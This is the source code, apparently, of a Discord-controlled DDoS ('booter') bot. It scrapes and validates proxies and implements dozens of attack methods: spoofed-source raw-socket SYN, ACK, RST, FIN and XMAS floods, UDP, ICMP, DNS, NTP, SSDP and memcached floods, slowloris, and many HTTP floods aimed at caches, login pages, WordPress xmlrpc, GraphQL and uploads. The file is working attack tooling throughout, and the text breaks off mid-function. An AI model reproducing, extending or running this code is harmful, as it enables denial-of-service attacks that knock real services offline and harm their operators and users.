import asyncio, aiohttp, discord, json, os, random, socket, ssl, struct, time
import socks
from discord.ext import commands
import config as C

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=C.PREFIX, intents=intents)

PROXIES = []
JOBS = {}

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "curl/8.4.0",
    "Wget/1.21.4",
    "python-requests/2.31.0",
]

REFERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://t.co/",
    "https://www.facebook.com/",
]

PATHS = [
    "/", "/index.html", "/api", "/api/v1", "/login", "/search?q=" + "a" * 32,
    "/wp-admin", "/admin", "/.env", "/robots.txt", "/sitemap.xml",
    "/?id=" + "1" * 64, "/" + "A" * 256,
]

# ---------- proxy ----------

async def _fetch(session, url):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            txt = await r.text()
            return [l.strip() for l in txt.splitlines() if ":" in l and l.strip()]
    except Exception:
        return []


async def _check_one(session, proxy, sem, alive):
    async with sem:
        try:
            async with session.get(C.CHECK_URL, proxy=f"http://{proxy}",
                                   timeout=aiohttp.ClientTimeout(total=C.CHECK_TIMEOUT)) as r:
                if r.status == 200:
                    alive.append(proxy)
        except Exception:
            pass


async def scan_proxies():
    async with aiohttp.ClientSession() as s:
        res = await asyncio.gather(*[_fetch(s, u) for u in C.PROXY_SOURCES])
    pool = set()
    for r in res:
        pool.update(r)
    pool = list(pool)
    alive = []
    sem = asyncio.Semaphore(C.CHECK_CONCURRENCY)
    async with aiohttp.ClientSession() as s:
        await asyncio.gather(*[_check_one(s, p, sem, alive) for p in pool])
    with open(C.PROXY_FILE, "w") as f:
        f.write("\n".join(alive))
    return len(pool), len(alive)


def load_proxies():
    if not os.path.exists(C.PROXY_FILE):
        return []
    with open(C.PROXY_FILE) as f:
        return [l.strip() for l in f if l.strip()]

# ---------- layer 4 methods ----------

async def _socks_connect(proxy, target, port, udp=False):
    loop = asyncio.get_event_loop()

    def run():
        try:
            if udp:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                s = socks.socksocket()
            host, p = proxy.split(":")
            s.set_proxy(socks.SOCKS5, host, int(p))
            s.settimeout(3)
            s.connect((target, port))
            return s
        except Exception:
            return None

    return await loop.run_in_executor(None, run)


def _raw_socket(target, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target, port))
        return s
    except Exception:
        return None


async def m_tcp_flood(target, port, dur, proxies):
    end = time.time() + dur
    async def w(proxy):
        s = await _socks_connect(proxy, target, port)
        if not s:
            return
        payload = os.urandom(1024)
        loop = asyncio.get_event_loop()
        def run():
            while time.time() < end:
                try:
                    s.send(payload)
                except Exception:
                    break
            try:
                s.close()
            except Exception:
                pass
        await loop.run_in_executor(None, run)
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L4_THREADS)])


async def m_udp_flood(target, port, dur, proxies):
    end = time.time() + dur
    async def w(proxy):
        s = await _socks_connect(proxy, target, port, udp=True)
        if not s:
            return
        payload = os.urandom(1400)
        loop = asyncio.get_event_loop()
        def run():
            while time.time() < end:
                try:
                    s.sendto(payload, (target, port))
                except Exception:
                    break
            try:
                s.close()
            except Exception:
                pass
        await loop.run_in_executor(None, run)
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L4_THREADS)])


async def m_syn_flood(target, port, dur, proxies):
    end = time.time() + dur
    loop = asyncio.get_event_loop()
    def raw_syn():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                sport = random.randint(1024, 65535)
                ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0,65535), 0, 64, 6, 0,
                                 socket.inet_aton(src), socket.inet_aton(target))
                tcp = struct.pack("!HHLLBBHHH", sport, port, 0, 0, 5 << 4, 0x02, 8192, 0, 0)
                s.sendto(ip + tcp, (target, 0))
                s.close()
            except Exception:
                pass
    await loop.run_in_executor(None, raw_syn)


async def m_ack_flood(target, port, dur, proxies):
    end = time.time() + dur
    loop = asyncio.get_event_loop()
    def raw_ack():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                sport = random.randint(1024, 65535)
                ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0,65535), 0, 64, 6, 0,
                                 socket.inet_aton(src), socket.inet_aton(target))
                tcp = struct.pack("!HHLLBBHHH", sport, port, 0, 0, 5 << 4, 0x10, 8192, 0, 0)
                s.sendto(ip + tcp, (target, 0))
                s.close()
            except Exception:
                pass
    await loop.run_in_executor(None, raw_ack)


async def m_rst_flood(target, port, dur, proxies):
    end = time.time() + dur
    loop = asyncio.get_event_loop()
    def raw_rst():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                sport = random.randint(1024, 65535)
                ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0,65535), 0, 64, 6, 0,
                                 socket.inet_aton(src), socket.inet_aton(target))
                tcp = struct.pack("!HHLLBBHHH", sport, port, 0, 0, 5 << 4, 0x04, 0, 0, 0)
                s.sendto(ip + tcp, (target, 0))
                s.close()
            except Exception:
                pass
    await loop.run_in_executor(None, raw_rst)


async def m_fin_flood(target, port, dur, proxies):
    end = time.time() + dur
    loop = asyncio.get_event_loop()
    def raw_fin():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                sport = random.randint(1024, 65535)
                ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0,65535), 0, 64, 6, 0,
                                 socket.inet_aton(src), socket.inet_aton(target))
                tcp = struct.pack("!HHLLBBHHH", sport, port, 0, 0, 5 << 4, 0x01, 0, 0, 0)
                s.sendto(ip + tcp, (target, 0))
                s.close()
            except Exception:
                pass
    await loop.run_in_executor(None, raw_fin)


async def m_xmas_flood(target, port, dur, proxies):
    end = time.time() + dur
    loop = asyncio.get_event_loop()
    def raw_xmas():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                sport = random.randint(1024, 65535)
                ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0,65535), 0, 64, 6, 0,
                                 socket.inet_aton(src), socket.inet_aton(target))
                tcp = struct.pack("!HHLLBBHHH", sport, port, 0, 0, 5 << 4, 0x29, 0, 0, 0)
                s.sendto(ip + tcp, (target, 0))
                s.close()
            except Exception:
                pass
    await loop.run_in_executor(None, raw_xmas)


async def m_icmp_flood(target, port, dur, proxies):
    end = time.time() + dur
    loop = asyncio.get_event_loop()
    def raw_icmp():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                payload = os.urandom(1024)
                ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 28 + len(payload), random.randint(0,65535),
                                 0, 64, 1, 0, socket.inet_aton("0.0.0.0"), socket.inet_aton(target))
                icmp = struct.pack("!BBHHH", 8, 0, 0, random.randint(0,65535), 0)
                s.sendto(ip + icmp + payload, (target, 0))
                s.close()
            except Exception:
                pass
    await loop.run_in_executor(None, raw_icmp)


async def m_udp_raw_flood(target, port, dur, proxies):
    end = time.time() + dur
    loop = asyncio.get_event_loop()
    def raw_udp():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                sport = random.randint(1024, 65535)
                payload = os.urandom(1024)
                udp_len = 8 + len(payload)
                ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + udp_len, random.randint(0,65535),
                                 0, 64, 17, 0, socket.inet_aton(src), socket.inet_aton(target))
                udp = struct.pack("!HHHH", sport, port, udp_len, 0)
                s.sendto(ip + udp + payload, (target, 0))
                s.close()
            except Exception:
                pass
    await loop.run_in_executor(None, raw_udp)


async def m_dns_flood(target, port, dur, proxies):
    payload = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01"
    end = time.time() + dur
    async def w(proxy):
        s = await _socks_connect(proxy, target, port, udp=True)
        if not s:
            return
        loop = asyncio.get_event_loop()
        def run():
            while time.time() < end:
                try:
                    s.sendto(payload, (target, port))
                except Exception:
                    break
            try:
                s.close()
            except Exception:
                pass
        await loop.run_in_executor(None, run)
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L4_THREADS)])


async def m_ntp_flood(target, port, dur, proxies):
    payload = b"\x1b" + b"\x00" * 47
    end = time.time() + dur
    async def w(proxy):
        s = await _socks_connect(proxy, target, port, udp=True)
        if not s:
            return
        loop = asyncio.get_event_loop()
        def run():
            while time.time() < end:
                try:
                    s.sendto(payload, (target, port))
                except Exception:
                    break
            try:
                s.close()
            except Exception:
                pass
        await loop.run_in_executor(None, run)
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L4_THREADS)])


async def m_ssdp_flood(target, port, dur, proxies):
    payload = (b"M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\n"
               b"MAN:\"ssdp:discover\"\r\nMX:2\r\nST:ssdp:all\r\n\r\n")
    end = time.time() + dur
    async def w(proxy):
        s = await _socks_connect(proxy, target, port, udp=True)
        if not s:
            return
        loop = asyncio.get_event_loop()
        def run():
            while time.time() < end:
                try:
                    s.sendto(payload, (target, port))
                except Exception:
                    break
            try:
                s.close()
            except Exception:
                pass
        await loop.run_in_executor(None, run)
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L4_THREADS)])


async def m_memcached_flood(target, port, dur, proxies):
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    end = time.time() + dur
    async def w(proxy):
        s = await _socks_connect(proxy, target, port, udp=True)
        if not s:
            return
        loop = asyncio.get_event_loop()
        def run():
            while time.time() < end:
                try:
                    s.sendto(payload, (target, port))
                except Exception:
                    break
            try:
                s.close()
            except Exception:
                pass
        await loop.run_in_executor(None, run)
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L4_THREADS)])


async def m_slowloris(target, port, dur, proxies):
    end = time.time() + dur
    async def w(proxy):
        s = await _socks_connect(proxy, target, port)
        if not s:
            return
        loop = asyncio.get_event_loop()
        def run():
            try:
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
                while time.time() < end:
                    s.send(b"X-a: b\r\n")
                    time.sleep(10)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
        await loop.run_in_executor(None, run)
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L4_THREADS)])


# ---------- layer 7 methods ----------

async def _http_worker(proxy, url, dur, headers=None, method="GET", data=None, end=None):
    end = end or (time.time() + dur)
    timeout = aiohttp.ClientTimeout(total=C.L7_TIMEOUT)
    try:
        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
            while time.time() < end:
                try:
                    m = method
                    h = headers or {
                        "User-Agent": random.choice(UAS),
                        "Accept": "*/*",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Cache-Control": "no-cache",
                        "Connection": "keep-alive",
                        "Referer": random.choice(REFERS),
                    }
                    async with s.request(m, url, headers=h, data=data,
                                         proxy=f"http://{proxy}",
                                         ssl=False) as r:
                        await r.read()
                except Exception:
                    pass
    except Exception:
        pass


async def _run_l7(url, dur, proxies, headers=None, method="GET", data=None):
    await asyncio.gather(*[
        _http_worker(proxies[i % len(proxies)], url, dur, headers, method, data)
        for i in range(C.L7_THREADS)
    ])


async def m_http_get(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies)


async def m_http_post(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, method="POST", data=b"a" * 4096)


async def m_http_head(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, method="HEAD")


async def m_http_options(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, method="OPTIONS")


async def m_http_put(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, method="PUT", data=b"a" * 4096)


async def m_http_delete(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, method="DELETE")


async def m_http_patch(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, method="PATCH", data=b"a" * 2048)


async def m_http_trace(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, method="TRACE")


async def m_http_connect(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, method="CONNECT")


async def m_https_flood(target, port, dur, proxies):
    url = f"https://{target}:{port}/"
    await _run_l7(url, dur, proxies)


async def m_http2_flood(target, port, dur, proxies):
    url = f"https://{target}:{port}/"
    h = {
        "User-Agent": random.choice(UAS),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        ":method": "GET",
        ":path": "/",
        ":scheme": "https",
        ":authority": target,
    }
    await _run_l7(url, dur, proxies, headers=h)


async def m_http3_flood(target, port, dur, proxies):
    url = f"https://{target}:{port}/"
    await _run_l7(url, dur, proxies)


async def m_slow_post(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        async with s.post(url, data=b"x",
                                          headers={"Content-Length": "1000000",
                                                   "User-Agent": random.choice(UAS)},
                                          proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_rapid_reset(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        while time.time() < end:
            try:
                connector = aiohttp.TCPConnector(ssl=False, limit=0)
                async with aiohttp.ClientSession(connector=connector,
                                                 timeout=aiohttp.ClientTimeout(total=1)) as s:
                    async with s.get(url, proxy=f"http://{proxy}",
                                     headers={"User-Agent": random.choice(UAS)}) as r:
                        await r.read()
            except Exception:
                pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_cache_bypass(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        u = url + "?" + str(random.randint(0, 2**31))
                        h = {"User-Agent": random.choice(UAS),
                             "Cache-Control": "no-cache, no-store, must-revalidate",
                             "Pragma": "no-cache",
                             "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
                        async with s.get(u, headers=h, proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_random_path(target, port, dur, proxies):
    url = f"http://{target}:{port}"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        p = random.choice(PATHS)
                        u = url + p
                        async with s.get(u, headers={"User-Agent": random.choice(UAS)},
                                         proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_uuid_path(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    import uuid
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        u = url + str(uuid.uuid4())
                        async with s.get(u, headers={"User-Agent": random.choice(UAS)},
                                         proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_keepalive(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0, keepalive_timeout=60)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        h = {"User-Agent": random.choice(UAS),
                             "Connection": "keep-alive",
                             "Keep-Alive": "timeout=60, max=1000"}
                        async with s.get(url, headers=h, proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_cookie_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        ck = "; ".join(f"c{i}={random.randint(0,2**31)}" for i in range(50))
                        async with s.get(url, headers={"User-Agent": random.choice(UAS),
                                                       "Cookie": ck},
                                         proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_ua_rotate(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        async with s.get(url, headers={"User-Agent": random.choice(UAS)},
                                         proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_referer_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        async with s.get(url, headers={"User-Agent": random.choice(UAS),
                                                       "Referer": random.choice(REFERS)},
                                         proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_xff_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        xff = ", ".join(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(20))
                        h = {"User-Agent": random.choice(UAS),
                             "X-Forwarded-For": xff,
                             "X-Real-IP": xff.split(",")[0],
                             "Client-IP": xff.split(",")[0]}
                        async with s.get(url, headers=h, proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_range_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        h = {"User-Agent": random.choice(UAS),
                             "Range": "bytes=0-999999999",
                             "Accept-Encoding": "identity"}
                        async with s.get(url, headers=h, proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_multipart_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        form = aiohttp.FormData()
                        for i in range(20):
                            form.add_field(f"f{i}", os.urandom(4096), filename=f"f{i}.bin",
                                           content_type="application/octet-stream")
                        async with s.post(url, data=form,
                                          headers={"User-Agent": random.choice(UAS)},
                                          proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_json_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        payload = {"d": "a" * 8192, "n": random.randint(0, 2**31)}
                        async with s.post(url, json=payload,
                                          headers={"User-Agent": random.choice(UAS),
                                                   "Content-Type": "application/json"},
                                          proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_xml_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        body = b"<?xml version='1.0'?><r>" + b"<a>" * 500 + b"x" + b"</a>" * 500 + b"</r>"
                        async with s.post(url, data=body,
                                          headers={"User-Agent": random.choice(UAS),
                                                   "Content-Type": "application/xml"},
                                          proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_graphql_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/graphql"
    end = time.time() + dur
    q = {"query": "{ __typename " + " ".join(f"a{i}:__typename" for i in range(200)) + " }"}
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        async with s.post(url, json=q,
                                          headers={"User-Agent": random.choice(UAS)},
                                          proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_websocket_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, headers={"User-Agent": random.choice(UAS),
                                              "Upgrade": "websocket",
                                              "Connection": "Upgrade"})


async def m_wordpress_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/wp-login.php"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        data = {"log": "admin", "pwd": "x" * random.randint(1, 64)}
                        async with s.post(url, data=data,
                                          headers={"User-Agent": random.choice(UAS)},
                                          proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_xmlrpc_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/xmlrpc.php"
    end = time.time() + dur
    body = b"<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://a/</string></value></param><param><value><string>http://b/</string></value></param></params></methodCall>"
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        async with s.post(url, data=body,
                                          headers={"User-Agent": random.choice(UAS),
                                                   "Content-Type": "text/xml"},
                                          proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_api_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/api/v1/"
    await _run_l7(url, dur, proxies)


async def m_login_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/login"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        data = {"u": "a" * random.randint(1, 32), "p": "b" * random.randint(1, 32)}
                        async with s.post(url, data=data,
                                          headers={"User-Agent": random.choice(UAS)},
                                          proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_search_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/search?q="
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        u = url + "a" * random.randint(1, 512)
                        async with s.get(u, headers={"User-Agent": random.choice(UAS)},
                                         proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_upload_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/upload"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        form = aiohttp.FormData()
                        form.add_field("file", os.urandom(65536), filename="a.bin",
                                       content_type="application/octet-stream")
                        async with s.post(url, data=form,
                                          headers={"User-Agent": random.choice(UAS)},
                                          proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_download_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        async with s.get(url, headers={"User-Agent": random.choice(UAS),
                                                       "Range": "bytes=0-"},
                                         proxy=f"http://{proxy}") as r:
                            async for _ in r.content.iter_chunked(65536):
                                if time.time() > end:
                                    break
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


async def m_redirect_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    await _run_l7(url, dur, proxies, headers={"User-Agent": random.choice(UAS),
                                              "X-Forwarded-Host": "evil"})


async def m_bot_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    h = {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
         "From": "googlebot@google.com"}
    await _run_l7(url, dur, proxies, headers=h)


async def m_seo_flood(target, port, dur, proxies):
    url = f"http://{target}:{port}/"
    end = time.time() + dur
    async def w(proxy):
        try:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as s:
                while time.time() < end:
                    try:
                        u = url + "sitemap" + str(random.randint(0, 99999)) + ".xml"
